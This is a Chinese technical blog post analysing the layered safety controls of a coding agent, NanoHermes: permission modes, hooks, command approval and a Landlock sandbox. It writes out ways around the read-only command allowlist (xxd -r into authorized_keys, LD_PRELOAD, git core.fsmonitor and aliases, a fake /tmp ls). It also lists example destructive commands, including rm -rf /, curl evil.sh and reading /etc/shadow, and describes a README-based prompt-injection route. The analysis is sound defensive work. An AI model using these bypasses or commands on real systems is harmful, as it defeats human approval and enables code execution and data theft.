---
title: "Agent 安全：让它跑命令而不失控"
slug: agent-security-run-commands-safely
cover_image: /photos/agent-security-cover.png
date: 2026-10-28
tags: [Agent, Agent 工程, 安全, 架构设计]
---

> 适用读者：准备把 coding agent 接到真实仓库、真实机器上的人；被「它删了我的文件」或「它读了我的密钥」吓过的人；想知道权限模式、审批、钩子、内核沙箱这四层到底谁在挡谁的人
> 结论先行：NanoHermes 的安全不是一个开关，而是五道独立的闸门——工具清单、权限模式、PreToolUse 钩子、命令审批、Landlock 沙箱。它们按顺序逐层收窄，任何一层失效都不应该让整条链路失守。而实测下来，最薄弱的一环不在沙箱里，在于**沙箱只覆盖子进程，不覆盖内置文件工具**
> 阅读时间：约 55 分钟 | 难度：进阶 | 收获：五道闸门的完整调用链 + 只读命令白名单的四个绕过 + Landlock 手写实现的关键细节 + 沙箱覆盖不到的四个面 + 七处可加固点

**目录**

- 前言：安全不是一个开关，是五道独立的闸门
- 结论先行：五道闸门与它们各自的失效模式
- 权限模式：五种模式到底挡了什么
- 默认配置的真实姿态
- 第一道闸门 check_tool 的三层判定
- 白名单与黑名单：顺序决定语义
- PreToolUse 钩子：一条可以否决的工具链
- 钩子的边界：30 秒、无沙箱、可信配置
- 审批策略：三个值，一个短路
- is_trusted_command 的六条判定
- 只读白名单的四个漏洞
- 按 basename 判定：`/tmp/ls` 也算可信
- 环境变量前缀：LD_PRELOAD 那一行
- git 子命令白名单为什么挡不住别名
- 元字符屏蔽：那九个字符是必要的
- Landlock：不引入任何 crate 的内核沙箱
- pre_exec 里能做什么，不能做什么
- ABI 版本与掩码：为什么权限要按版本裁剪
- 只读根加工作区可写：两条路径规则
- 网络没有被限制
- 失败即拒绝：为什么不肯降级
- 沙箱只覆盖子进程：最大的缺口
- resolve 不做规范化：绝对路径与 .. 直通
- 符号链接：内核沙箱与内置工具的差异
- 四个逃逸面
- 权限模式与沙箱的交叉矩阵
- plan 模式为什么不是只读沙箱
- goal 模式：没有人可以问
- 交叉验证：七个攻击场景
- 七处可以加固的地方
- 怎么测试安全边界
- 小结：先假设最坏，再逐层放宽

## 前言：安全不是一个开关，是五道独立的闸门

给 Agent 加安全，最常见的做法是加一个 `--safe` 开关。这个做法必然失败，因为安全问题不是一个维度的问题：

- 模型想调用一个不该存在的工具
- 模型调用了合法工具，但参数指向了工作区之外
- 模型的命令看起来只读，实际能写文件
- 模型确实需要跑一条危险命令，但它不该在没有人类同意时跑
- 命令本身合法，但它 spawn 的子进程做了别的事

这五种情况需要五种不同的拦截点。所以「安全」的正确定义不是「一个开关」，而是**一组按顺序生效的闸门，每道闸门负责一个维度，且任何一道都不依赖其他道来兜底**。

NanoHermes 有五道：工具清单（模型能看见什么）、权限模式（这一轮允许做什么）、PreToolUse 钩子（用户自定义的否决）、命令审批（跑之前问人）、Landlock 沙箱（内核层面的文件系统限制）。它们分布在完全不同的层——从 JSON 生成到内核系统调用——这种分散本身就是设计意图：**一层被绕过，还有下一层**。

本文按调用链的顺序走这五道闸门，然后专门拆解每一道单独失效时会发生什么。最后一节给出七个真实可复现的攻击场景和七处加固建议。

## 结论先行：五道闸门与它们各自的失效模式

先看全景。一次工具调用从模型输出到真正执行，经过的检查是严格有序的：

| 顺序 | 闸门 | 位置 | 挡住了什么 | 失效后果 |
| --- | --- | --- | --- | --- |
| 1 | 工具清单过滤 | `build_tools` | 模型看不到被封禁的工具 | 模型尝试调用，被第 2 道拦下 |
| 2 | `check_tool` | `execute` 第一行 | 模式封禁 + 黑名单 + 白名单 | 任意工具可执行 |
| 3 | PreToolUse 钩子 | `execute` 中段 | 用户脚本的非零退出 | 用户自定义策略失效 |
| 4 | 命令审批 | `run_command` / `git_commit` | 非只读命令 | 危险命令无人工确认即执行 |
| 5 | Landlock | `pre_exec`（子进程） | 沙箱外的文件写入 | 子进程可写全盘 |

五道闸门的覆盖面是嵌套的，不是并列的：

- 第 1 道是「广告」层，只管模型看见什么，不负责拦截
- 第 2、3 道是「工具级」，对每个工具调用都生效
- 第 4 道是「命令级」，只对 `run_command` 和 `git_commit` 生效
- 第 5 道是「进程级」，只对 `Command::spawn` 出来的子进程生效

这个嵌套关系直接决定了最关键的一个结论：**内置文件工具（`read_file`、`write_file`、`edit_file`、`apply_patch`）只受第 2、3 道管，完全不受第 4、5 道管**。也就是说，命令审批和内核沙箱再好，也挡不住 agent 自己用 `write_file` 往 `/etc/` 里写东西——因为它根本没有 spawn 子进程。

## 权限模式：五种模式到底挡了什么

`PermissionMode` 是这套安全模型里最上层的抽象，五种模式各自回答一个不同的问题：

| 模式 | 意图 | 封禁的工具 | auto_approve | 审批策略 |
| --- | --- | --- | --- | --- |
| `default` | 正常干活 | 无 | 继承配置 | 继承配置 |
| `accept-edits` | 文件改动免问，命令仍问 | 无 | 强制 false | 继承配置 |
| `plan` | 只读分析 | 写文件、打补丁、跑命令、提交 | 继承配置 | 继承配置 |
| `goal` | 无人值守跑到目标 | 无 | 强制 true | 强制 never |
| `debug` | 复现问题但别改坏 | 写文件、打补丁、提交 | 继承配置 | 继承配置 |

三条设计逻辑值得单独说。

**`accept-edits` 是最反直觉的一个。** 它的名字暗示「放宽」，实现却是把 `auto_approve` 强制成 false——因为在这个模式下，免问的只有文件编辑，而「命令仍然要问」这件事必须显式保证。如果它继承配置里的 `auto_approve: true`，整个模式就变成了「什么都不问」。代码里的注释写得很直白：

```rust
/// `AcceptEdits` always keeps shell confirmation on; `Goal` has nobody to
/// ask, so it never blocks; the rest inherit the configured flag.
pub fn auto_approve(self, configured: bool) -> bool {
    match self {
        PermissionMode::AcceptEdits => false,
        PermissionMode::Goal => true,
        PermissionMode::Default | PermissionMode::Plan | PermissionMode::Debug => configured,
    }
}
```

**`goal` 是唯一一个主动放弃人类监督的模式。** 它同时做两件事：把 `auto_approve` 强制成 true，把审批策略强制成 `Never`。理由写在文档注释里：「没有人在旁边可以问」。这是诚实的做法——与其假装会问、实际永远超时失败，不如明确宣布不问。

**`plan` 和 `debug` 的区别在 `run_command`。** `plan` 封禁它，`debug` 允许它。理由也清楚：`plan` 是「读代码想方案」，`debug` 是「跑起来复现问题」。但两个模式对文件写入的态度完全一致——都封。这一点经常被误解为「`debug` 比 `plan` 危险」，实际上它们的危险面是正交的：`debug` 允许执行任意代码，`plan` 不允许。

## 默认配置的真实姿态

把默认值摊开看，会发现一个和文档预期不一致的地方：

```rust
auto_approve: true,
approval_policy: ApprovalPolicy::Untrusted,
sandbox: SandboxMode::Off,
permission_mode: PermissionMode::Default,
```

`auto_approve` 的默认值是 **true**。而 `needs_approval` 的第一行就是：

```rust
if auto_approve {
    return false;
}
```

所以默认配置下，`approval_policy: Untrusted`（「每条命令都问」）**完全不起作用**——它被短路了。同样的，`sandbox: Off` 意味着 Landlock 根本不会被挂上。

也就是说，不带任何 flag 直接跑 `nanohermes "改掉这个 bug"`，真实姿态是：**所有工具可用、所有命令不询问、文件系统无限制**。

而 CLI 帮助文本写的是：

```text
--approval-policy <P>   never | on-request | untrusted (default: untrusted with -y)
```

「untrusted with -y」这句话有歧义：读起来像是「`-y` 时是 untrusted」。实际上 `-y` 做的是把策略设成 `Never` 并把 `auto_approve` 设成 true——和帮助文本说的正好相反。

这不是一个可以忽略的文档瑕疵。用户读帮助文本会得到一个「默认会问我」的印象，实际默认不问。安全类配置的错误默认值比缺失功能危险得多，因为它让人**以为自己在被保护**。

修法有两种，都不复杂：

```rust
// 方案一：默认不自动批准，让 -y 才放开
auto_approve: false,
approval_policy: ApprovalPolicy::OnRequest,

// 方案二：保持自动批准，但把它写进启动横幅
// "auto-approve ON · sandbox OFF · permission=default"
```

方案一更安全，但会改变现有用户的交互（每条非只读命令都多一次提示）。方案二不改变行为，只消除误解。对一个已经有大量自动化用法的工具，方案二是现实选择——前提是横幅必须在每一次启动时打印，而不是只在 `--status` 里。

## 第一道闸门 check_tool 的三层判定

`check_tool` 是唯一一个对所有工具生效的检查，三层顺序不能换：

```rust
pub fn check_tool(&self, name: &str) -> Result<(), String> {
    // 1. 模式级硬封禁
    if self.permission_mode.blocked_tools().contains(&name) {
        return Err(format!(
            "tool `{name}` is not available in {:?} mode",
            self.permission_mode
        ));
    }
    // 2. 黑名单永远优先
    if self.disallowed_tools.iter().any(|t| t == name) {
        return Err(format!("tool `{name}` is disallowed by configuration"));
    }
    // 3. 白名单只在非空时生效
    if !self.allowed_tools.is_empty() && !self.allowed_tools.iter().any(|t| t == name) {
        return Err(format!("tool `{name}` is not in the allowed list"));
    }
    Ok(())
}
```

三层语义各不相同：

**第一层是模式，它先于用户的任何配置。** 这意味着 `plan` 模式下即使你把 `write_file` 加进白名单也没用——模式封禁在最前面。这是对的：模式是「这一轮的意图」，配置是「长期偏好」，意图应该压倒偏好。

**第二层是黑名单，它压过白名单。** 一个人同时把工具写进两个列表时，结果是拒绝。这个选择符合安全领域的惯例：显式禁止优先于显式允许，因为「禁止」通常是在出事之后加的。

**第三层是白名单，空表示「不限制」。** 这里有个容易踩的语义陷阱：`allowed_tools: []` 不是「什么都不许」，而是「什么都许」。如果用户想限制成「只允许读文件」，必须写成 `allowed_tools: ["read_file", "list_dir", "grep", "glob"]`——而漏写一个工具的表现是「那个工具突然不能用了」，不是「多了不该有的能力」。这个方向是安全的（fail closed），但不符合直觉。

`check_tool` 的返回值有两种归宿，值得分清：

| 调用点 | 失败时的表现 |
| --- | --- |
| `build_tools()`（生成工具列表） | 工具永不出现在模型视野里 |
| `execute()`（执行前检查） | 返回一条 `ERROR: ...` 字符串给模型 |

第一处是「不告诉模型」，第二处是「告诉模型它被拒了」。两处都要有，因为模型可能从历史里学到工具名（上一轮允许、这一轮被模式封禁），也可能纯粹幻觉出一个不存在的工具名。

## 白名单与黑名单：顺序决定语义

上一节提到顺序，这里给一个完整的真值表，因为这是配置安全时最容易搞错的地方：

| `blocked_tools` | 黑名单 | 白名单 | 结果 | 原因 |
| --- | --- | --- | --- | --- |
| 命中 | 任意 | 任意 | 拒绝 | 模式优先 |
| 未命中 | 命中 | 任意 | 拒绝 | 黑名单压过白名单 |
| 未命中 | 未命中 | 空 | 允许 | 空表示不限制 |
| 未命中 | 未命中 | 命中 | 允许 | 白名单放行 |
| 未命中 | 未命中 | 未命中 | 拒绝 | 白名单非空即排他 |

第五行是关键：白名单一旦非空，就是**排他列表**。这让「渐进式收紧」变得危险——你先加了 `["read_file"]` 想看看效果，结果整个 agent 除了读文件什么都不能做。合理的做法是提供两个字段：`allowed_tools`（排他）和 `denied_tools`（追加），或者在文档里用「白名单非空即封禁其余」这样的明确措辞。

还有一个更隐蔽的问题：**白名单是按工具名匹配，不是按能力匹配。** 把 `run_command` 放进黑名单并不会阻止 `git_commit` 执行 `git commit`（它内部调 `Command`），也不会阻止 `subagent` 起一个子代理去改文件。工具是能力的载体，封禁工具名只是在封禁「入口」，不是封禁「能力」。

真正按能力封的是 `PermissionMode::Plan` 里的那五个工具——但它也只能封它知道的那五个。

## PreToolUse 钩子：一条可以否决的工具链

第三道闸门是用户自己写的。钩子是一个外部命令，通过 stdin 收到工具调用的 JSON，通过退出码表态：

```rust
for hook in self
    .cfg
    .hooks
    .iter()
    .filter(|h| h.event == HookEvent::PreToolUse && h.matches(&call.name))
{
    match hooks::run(hook, &call.name, &args, &self.cfg.workspace) {
        Ok(o) if o.ok() => {}
        Ok(o) => {
            return format!(
                "ERROR: `{}` blocked by PreToolUse hook (exit {}):\n{}",
                call.name, o.code, o.output
            )
        }
        Err(e) => return format!("ERROR: PreToolUse hook failed: {e}"),
    }
}
```

四个设计点：

**任何非零退出都算拒绝。** 不区分退出码 1 和 3，也不区分「故意拒绝」和「脚本自己崩了」。这是 fail closed：钩子崩溃不该被理解成「没有意见」。

**钩子的输出会原样回到模型。** 所以钩子可以写「不要在 `src/generated/` 下改文件，那些是生成的」，模型能读懂。这让钩子不仅是拦截器，还是策略的传达通道。

**`PreToolUse` 的失败直接返回，不执行工具。** 对比 `PostToolUse`：

```rust
Ok(o) => result.push_str(&format!(
    "\n[PostToolUse hook exited {}]\n{}",
    o.code, o.output
)),
```

PostToolUse 的非零退出只是往结果里追加一段文字，**不影响已经发生的事实**。这个不对称是对的：事后钩子没有否决权，否则你既执行了操作又声称它被拒绝，历史会自相矛盾。

**`filter` 里用 `h.matches(&call.name)`。** 匹配器支持通配（`*`）和精确名，所以可以写「所有 `write_*` 都要检查」。这个设计让钩子能表达「按工具类别」的策略，而不只是逐个列举。

## 钩子的边界：30 秒、无沙箱、可信配置

钩子有三个必须知道的边界。

**第一，30 秒硬超时。**

```rust
const HOOK_TIMEOUT_SECS: u64 = 30;
```

超时后 `kill` 子进程，退出码记成 `-2`，输出里追加「hook timed out」。对 PreToolUse 来说，`-2` 是非零，所以超时等于拒绝。这个语义是对的——一个卡住的钩子不能让整个 agent 无限等，也不能被当成放行。

但要注意实现里的一个细节：超时分支只 `kill` 再 `wait`，然后 `join` 两个排空线程。如果钩子自己又 spawn 了子进程并且没被杀掉（`kill` 只杀直接子进程），那两个排空线程会一直等到管道 EOF——也就是等到那个孙进程退出。所以「30 秒超时」对「钩子里跑了个后台服务」这种写法并不成立。

**第二，钩子没有沙箱。** `hooks::run` 里对 `shell_command` 只设了 `current_dir`、`NANOHERMES_TOOL_NAME` 和 `NANOHERMES_HOOK_EVENT` 两个环境变量、以及三根管道，**没有调用 `sandbox::attach`**。所以钩子以完整权限运行，能读写全盘。这是合理的——钩子是用户自己配的，属于「可信配置」——但它意味着 `sandbox: read-only` 这个设置对钩子完全无效。如果你的钩子命令是 `./scripts/check.sh`，而这个脚本会 clone 仓库，那它就能在工作区外写文件。

**第三，钩子的失败路径会漏线程。** 看这一段：

```rust
Err(e) => return Err(format!("failed to wait for hook: {e}")),
```

`try_wait` 出错时直接 `return`，两个已经 `spawn` 的排空线程既没 `join` 也没被丢弃（`JoinHandle` 被 drop 等于 detach）。它们会继续跑，直到管道 EOF。这条路径概率极低（`try_wait` 只在 `waitpid` 系统调用失败时才 `Err`），但它是「泄漏一个线程」而不是「返回一个错误」——在长时间运行的守护进程里值得修。

## 审批策略：三个值，一个短路

第四道闸门是 `needs_approval`，它在 `run_command` 和 `git_commit` 里各调一次：

```rust
pub fn needs_approval(auto_approve: bool, policy: ApprovalPolicy, command: &str) -> bool {
    if auto_approve {
        return false;
    }
    match policy {
        ApprovalPolicy::Never => false,
        ApprovalPolicy::Untrusted => true,
        ApprovalPolicy::OnRequest => !is_trusted_command(command),
    }
}
```

三个策略的语义：

| 策略 | 问不问 | 典型场景 |
| --- | --- | --- |
| `never` | 从不问 | 完全信任 / 无人值守 |
| `on-request` | 只问非只读命令 | 日常交互 |
| `untrusted` | 每条都问，包括 `ls` | 首次接触陌生仓库 |

`auto_approve` 的短路是第一行的绝对优先。这让「模式强制放开」可以覆盖任何策略——`goal` 模式就是这么做的。

这里有一个值得单独指出的语义问题：**`Untrusted` 会连 `ls` 都问。** 这听起来很安全，实践里却会导致「审批疲劳」——用户问了几十次之后开始无脑按 `y`，真正的危险命令混在其中就过去了。安全设计里有个说法叫「告警疲劳是安全最大的敌人」，`Untrusted` 是它的教科书案例。

`OnRequest` 是更合理的默认值：只对非只读命令提问。它的质量完全取决于 `is_trusted_command` 判定得准不准——也就是下一节的内容。

## is_trusted_command 的六条判定

这个函数是整个审批体系的核心，判定顺序是：

```rust
pub fn is_trusted_command(command: &str) -> bool {
    let cmd = command.trim();
    if cmd.is_empty() {
        return false;
    }
    // 1. 任何控制操作符、重定向、命令替换都直接判不可信
    if cmd.chars().any(|c| {
        matches!(
            c,
            '|' | '&' | ';' | '<' | '>' | '`' | '$' | '(' | ')' | '\n'
        )
    }) {
        return false;
    }
    // 2. 跳过前置的 KEY=VALUE
    let program = loop {
        match tokens.next() {
            Some(t) if is_env_assignment(t) => continue,
            Some(t) => break t,
            None => return false,
        }
    };
    // 3. 按 basename 判定
    let program = program.rsplit('/').next().unwrap_or(program);
    // 4. git 走子命令白名单，其余走二进制白名单
    if program == "git" {
        return git_subcommand_is_read_only(&mut tokens);
    }
    TRUSTED_BINARIES.contains(&program)
}
```

六条判定分别是：非空、无控制操作符、跳过环境变量、取 basename、git 特判、查白名单。

前两条是必要的。控制操作符列表里最重要的是 `|`、`&`、`;`、`<`、`>`——分别对应管道、后台/与、命令分隔、输入重定向、输出重定向。反引号和 `$` 挡的是命令替换（`$(...)` 与反引号包裹）。`(` 和 `)` 挡的是子 shell。`\n` 挡的是「第一行看着无害，第二行是 `rm -rf /`」。

这一层做得对，而且测试覆盖了主要形态：

```rust
assert!(!is_trusted_command("echo hi > f"));
assert!(!is_trusted_command("ls | rm"));
assert!(!is_trusted_command("ls && rm"));
assert!(!is_trusted_command("$(rm x)"));
```

但后四条各有各的问题。接下来三节分别拆。

## 只读白名单的四个漏洞

`TRUSTED_BINARIES` 有 62 个条目，注释的承诺是「纯粹只读、从不写入、从不 spawn 其他程序」。至少有四个成员违反了这个承诺：

| 命令 | 写文件的写法 | 为什么算「可信」的误判 |
| --- | --- | --- |
| `sort` | `sort -o out.txt in.txt` | `-o` 直接把结果写进文件 |
| `tree` | `tree -o out.txt` | `-o` 同上，tree 有输出到文件选项 |
| `xxd` | `xxd -r in.hex out.bin` | `-r` 反向转换，把 hex 还原成二进制并写盘 |
| `date` | `date -s "2026-01-01"` | `-s` 设置系统时间（需要权限） |

其中 `sort -o` 和 `tree -o` 是标准用法，不需要任何特殊权限，在任何用户下都能写文件。而 `xxd -r` 能写出**任意二进制内容**——这意味着一个「只读」白名单条目实际上可以提供完整的文件写入能力：

```text
xxd -r payload.hex /home/user/.ssh/authorized_keys
```

这条命令不含任何控制操作符，程序名是 `xxd`，在白名单里，参数是普通文件名。`is_trusted_command` 返回 true，`OnRequest` 策略下不需要审批。

`date -s` 的后果更微妙：它不写文件，但会改变系统时间，足以破坏依赖时间的证书校验、日志顺序、构建缓存。

修法不是把四个条目删掉——那会连带砍掉它们的正常用法（`sort` 排序、`tree` 看目录树都是好工具）。正确做法是**从「按程序名判定」升级成「按程序名加参数判定」**：

```rust
fn is_read_only_invocation(program: &str, args: &[&str]) -> bool {
    match program {
        "sort" | "tree" => !args.iter().any(|a| a == "-o" || a.starts_with("-o")),
        "xxd" => !args.iter().any(|a| a == "-r"),
        "date" => !args.iter().any(|a| a == "-s" || a.starts_with("--set")),
        _ => TRUSTED_BINARIES.contains(&program),
    }
}
```

这个改动很小，但它把安全模型从「信任程序」变成「信任调用」。后者的语义才是对的：`sort` 不是只读的，「`sort` 不带 `-o`」才是只读的。

## 按 basename 判定：`/tmp/ls` 也算可信

第二处问题是 `program.rsplit('/').next()`：

```rust
let program = program.rsplit('/').next().unwrap_or(program);
```

它的本意是「`/bin/ls` 和 `ls` 是同一个程序」。但它同时也让 `/tmp/evil/ls` 变成了「可信的 `ls`」——只要文件名是 `ls`，不管这个文件是谁写的、内容是什么。

构造一个攻击不需要什么技巧：

```text
/tmp/x/ls -la
```

不含控制操作符，basename 是 `ls`，在白名单里，判定为可信，不询问就执行。而 `/tmp/x/ls` 可以是任意脚本。

这个洞的严重性取决于攻防假设。如果假设是「模型是善意的、只是偶尔犯错」，那这个洞无所谓——模型不会去执行 `/tmp/x/ls`。但如果假设是「仓库里可能有一个恶意文件，模型可能读到它并照着执行」，那这就是一条完整的远程代码执行路径：往仓库里放一个叫 `ls` 的可执行文件，在 `README` 里诱导模型跑它。

修法有两档：

**弱一点：** 只对「没有路径分隔符」的命令做 basename 匹配。带 `/` 的一律要求审批。

```rust
let program = if program.contains('/') {
    return false;   // 显式路径一律不可信
} else {
    program
};
```

这个改法会误伤 `/bin/ls` 这种绝对路径的正常用法——但它只是多问一次，不是不能用。fail closed 的方向是对的。

**强一点：** 校验路径的「可信根」。只有 `/bin`、`/usr/bin`、`/usr/local/bin` 下的程序可以按 basename 免问，其他路径一律问。这样既保留了 `/bin/ls` 的便利，又堵住了 `/tmp`。代价是要处理 `PATH` 查找、软链接（`/bin` 常常链到 `/usr/bin`）、以及 Windows 上没有 `/bin` 的事实。

对一个跨平台工具，第一档更现实。第二档适合在 Linux 上做严格模式。

## 环境变量前缀：LD_PRELOAD 那一行

第三处问题是「跳过前置的 `KEY=VALUE`」：

```rust
Some(t) if is_env_assignment(t) => continue,
```

跳过本身是对的——`FOO=bar ls` 和 `ls` 应该同样处理。但它只检查了「变量名合法」，没检查**变量值会不会改变执行行为**。

最直接的例子是 `LD_PRELOAD`：

```text
LD_PRELOAD=/tmp/evil.so ls
```

程序名是 `ls`，在白名单里，参数是 `-la` 或什么都没有，判定为只读可信，不询问就执行。而 `LD_PRELOAD` 会让动态链接器在 `ls` 启动前先加载 `/tmp/evil.so`——这等于在 `ls` 进程里执行任意代码，权限和 `ls` 完全相同（也就是你的全部权限）。

同类变量还有：

| 变量 | 作用 | 风险 |
| --- | --- | --- |
| `LD_PRELOAD` | 预加载共享库 | 任意代码执行 |
| `LD_LIBRARY_PATH` | 改变库搜索路径 | 劫持依赖库 |
| `GIT_SSH_COMMAND` | 指定 git 的 ssh 命令 | 只在网络操作生效，但可执行任意程序 |
| `PAGER` / `GIT_PAGER` | 指定分页器 | `git log` 会 spawn 它 |
| `BASH_ENV` | 非交互 bash 启动时读的文件 | 任意代码执行 |
| `NODE_OPTIONS` | Node 启动参数 | `--require /tmp/x.js` |

`PAGER` 这一项特别有意思：`git log` 在 `TRUSTED_GIT_SUBCOMMANDS` 里，是免问的只读命令。但如果用户环境里 `PAGER` 指向一个脚本，`git log` 就会 spawn 这个脚本。所以「git log 是只读的」这个判断依赖于**环境没有被污染**，而环境恰恰是模型能改的（通过前置赋值）。

修法：只允许「安全变量」前缀，或者干脆禁止任何环境变量前缀。

```rust
// 保守：不允许前置赋值
Some(t) if is_env_assignment(t) => return false,
```

代价是 `FOO=bar ./test` 这种用法每次都要问。对 Agent 场景可以接受——模型完全可以用 `export` 写在一条命令里，而那条命令本来就该问。

## git 子命令白名单为什么挡不住别名

`git` 的处理是整套判定里最复杂的一段：

```rust
fn git_subcommand_is_read_only<'a>(tokens: &mut impl Iterator<Item = &'a str>) -> bool {
    const VALUE_FLAGS: &[&str] = &["-C", "-c", "--git-dir", "--work-tree", "--namespace"];
    let mut pending_value = false;
    for token in tokens {
        if pending_value {
            pending_value = false;
            continue;
        }
        if token.starts_with('-') {
            if VALUE_FLAGS.contains(&token) {
                pending_value = true;
            }
            continue;
        }
        return TRUSTED_GIT_SUBCOMMANDS.contains(&token);
    }
    false
}
```

`VALUE_FLAGS` 的作用是跳过「带值的全局 flag」的下一个 token。没有它，`git -C /repo status` 会把 `/repo` 当成子命令，判定失败。有了它，`/repo` 被跳过，`status` 被正确识别。测试里覆盖了这个 case。

但这套逻辑有三个洞。

**洞一：`git -c` 的值可以指定任意程序。** `-c` 在 `VALUE_FLAGS` 里，所以它的值被跳过，然后 `status` 被判定为只读：

```text
git -c core.fsmonitor=/tmp/evil.sh status
```

`core.fsmonitor` 是 git 会**主动执行**的配置项（每次检查工作区状态时调用）。所以这条「只读」命令会执行 `/tmp/evil.sh`。同类配置还有 `core.editor`、`core.pager`、`diff.external`、`filter.*.clean`。

**洞二：`--exec-path` 不在 `VALUE_FLAGS` 里，但它以 `-` 开头所以被 `continue` 跳过。** 于是：

```text
git --exec-path=/tmp status
```

被判为只读，而 git 会从 `/tmp` 里找 `git-status` 来执行。

**洞三，也是最根本的：git 别名。** 如果用户的 `~/.gitconfig` 里有：

```ini
[alias]
    status = !rm -rf /tmp/x
```

那么 `git status` 会被 git 展开成 `!rm -rf /tmp/x` 并交给 shell 执行。判定函数看到的子命令是 `status`，在白名单里，于是免问执行——而实际跑的是完全不同的东西。

第三个洞的解决办法只有一条：**不看别名，直接看 git 真正会做什么**。可以用 `git config --get alias.status` 先查一遍，或者更简单——把 `git` 从「免问白名单」里整个拿掉。只读 git 命令的收益（少问几次）远小于这三个洞的风险，尤其 `git status` 后面跟着的往往还有 `git diff`、`git log`，全都可以用同样方式劫持。

一个折中方案：把 git 的可信判定改成「必须是 `git <sub>` 形式，且不含任何 `-c` / `--exec-path` / `--config-env`，且通过 `git config --get alias.<sub>` 确认没有别名」。三条都满足才免问。这个逻辑大约 20 行，但需要额外 spawn 一次 git——对「免问」这个目标来说，成本已经高到不值得了。

## 元字符屏蔽：那九个字符是必要的

回到第一节的判定。九个字符的屏蔽是整套逻辑里最有效的一条，值得单独说清它的完备性。

| 字符 | 挡住的构造 | 如果漏了会怎样 |
| --- | --- | --- |
| 竖线 | 管道 | `ls \| rm -rf /` |
| `&` | 后台、逻辑与 | `ls && curl evil.sh` |
| `;` | 命令分隔 | `ls; rm -rf /` |
| `<` | 输入重定向 | `cat < /etc/shadow` |
| `>` | 输出重定向 | `echo x > ~/.bashrc` |
| 反引号 | 命令替换 | ls 后跟反引号包裹的 rm |
| `$` | 变量、命令替换 | `ls $(rm -rf /)` |
| `(` `)` | 子 shell | `(rm -rf /)` |
| 换行 | 多行命令 | 第一行 `ls`，第二行 `rm -rf /` |

这套屏蔽的关键在于：**它是在「按空白切词」之前做的，针对的是整条命令字符串**。所以不管这些字符出现在哪个位置（引号里、单词中间），都会被拦。这比「先切词再检查每个 token」可靠得多，因为引号和转义会让切词结果和 shell 的真实解析不一致。

但要说清它不挡什么：

- 反斜杠没挡——`\rm` 在 shell 里就是 `rm`，但 `is_trusted_command` 看到的 program 是 `\rm`，不在白名单里，所以判不可信。方向是安全的，只是会误报
- `#`（注释）和引号都没挡——注释不影响执行，引号本身不构成危险，引号里的内容一旦含元字符就会被挡

所以这九个字符的组合是够用的。真正的风险不在元字符，而在前面三节讲的「程序身份的判定」——元字符挡的是「一条命令做多件事」，而 `sort -o`、`/tmp/ls`、`LD_PRELOAD` 都是「一条命令做一件事，但那件事不是你以为的」。

## Landlock：不引入任何 crate 的内核沙箱

前四道闸门都在应用层。第五道在**内核层**，而且它的实现方式值得单独拆——因为它没有引入任何依赖。

Linux 5.13 引入的 Landlock 是一个「非特权进程自我限制」的机制：进程可以给自己装一套规则，声明「我只能访问这些路径的这些权限」，安装之后**无法撤销**，且对子进程继承。这正好是沙箱需要的东西。

NanoHermes 直接用裸系统调用实现，三个调用号硬编码：

```rust
const SYS_LANDLOCK_CREATE_RULESET: usize = 444;
const SYS_LANDLOCK_ADD_RULE: usize = 445;
const SYS_LANDLOCK_RESTRICT_SELF: usize = 446;
```

这三个号在 x86_64 和 aarch64 上是相同的（Landlock 的设计者特意让它们跨架构一致），所以不需要按架构分支。这也是为什么代码里的 `cfg` 只按 `target_os = "linux"` 和两个架构开关，不处理 armv7、riscv 等。

它同时还需要一个 prctl：

```rust
const PR_SET_NO_NEW_PRIVS: usize = 38;
```

这个必须最先做，因为 Landlock 的规则集只能在 `no_new_privs` 下生效——否则一个 setuid 程序就能绕过限制。

## pre_exec 里能做什么，不能做什么

沙箱必须装在**子进程 fork 之后、exec 之前**。Rust 给的入口是 `CommandExt::pre_exec`：

```rust
cmd.pre_exec(move || {
    apply(handled, abi, root.as_c_str(), ws.as_deref())
        .map_err(std::io::Error::from_raw_os_error)
});
```

这段闭包运行在 fork 出来的子进程里，此时整个进程只有一个线程（fork 只复制调用线程），所有其他线程的锁状态都是不确定的。这意味着闭包里**绝对不能**：

- 分配内存（`malloc` 可能持有父进程某把锁）
- 获取任何锁（那把锁可能正被父进程另一个线程持有）
- 调用任何非 async-signal-safe 的函数
- 做格式化输出、`println!`、panic（panic 会走格式化，可能分配）

代码里的实现严格守住了这条线：`apply` 只用栈上的 `RulesetAttr` 和 `PathBeneathAttr` 两个 `#[repr(C)]` 结构体，只调 `syscall`，失败时返回 errno 而不是构造字符串。这一行的注释也写明了：

```rust
// SAFETY: the closure runs in the freshly forked child before `exec`;
// it issues raw syscalls and touches only stack-allocated structs, so
// it performs no allocation and takes no locks.
```

这是整个沙箱实现里最容易写错的地方。一个很自然的写法是「失败时 `format!` 一个错误消息」——那就会在 fork 后的子进程里 `malloc`，在父进程高并发时偶发死锁。表现出来是「命令偶尔卡住」，几乎无法定位。

另一个细节是 `CString` 的预分配：

```rust
let root = CString::new("/").expect("literal has no NUL");
let ws = CString::new(workspace.as_os_str().as_bytes())
    .map_err(|_| format!("workspace path {workspace:?} contains a NUL byte"))?;
```

两个 `CString` 在 `attach` 时就构造好，被 `move` 进闭包。所以闭包里只有 `as_c_str()`，没有分配。这个「把所有准备工作提前到 fork 之前」的模式是 `pre_exec` 的正确用法。

## ABI 版本与掩码：为什么权限要按版本裁剪

Landlock 是随内核演进的。每个版本增加新的权限位，而传入未知位会导致 `EINVAL`：

```rust
fn handled_fs_bits(abi: u32) -> u64 {
    let mut bits = ALL_FS;
    if abi < 2 {
        bits &= !FS_REFER;      // ABI 2 才有跨目录 rename
    }
    if abi < 3 {
        bits &= !FS_TRUNCATE;   // ABI 3 才有 truncate
    }
    if abi < 5 {
        bits &= !FS_IOCTL_DEV;  // ABI 5 才有设备 ioctl
    }
    bits
}
```

这个裁剪不是可选的优化，是必须的：在 ABI 1 的内核上传 `FS_TRUNCATE` 位，`create_ruleset` 直接返回 `EINVAL`，整个沙箱装不上。而「装不上」在这里等于「命令不能跑」（下一节讲为什么），所以裁剪逻辑错了的表现是「所有命令都失败」。

同样，结构体大小也要按版本给：

```rust
fn ruleset_size(abi: u32) -> usize {
    if abi >= 6 { 24 } else if abi >= 4 { 16 } else { 8 }
}
```

三个 `u64` 分别是 `handled_access_fs`、`handled_access_net`（ABI 4 加）、`scoped`（ABI 6 加）。内核的约定是「结构体可以比你认识的小」——传小一点是合法的，多出来的字段会被当成 0。所以这个「按版本给最小够用大小」的写法是向前兼容的，而不是取巧。

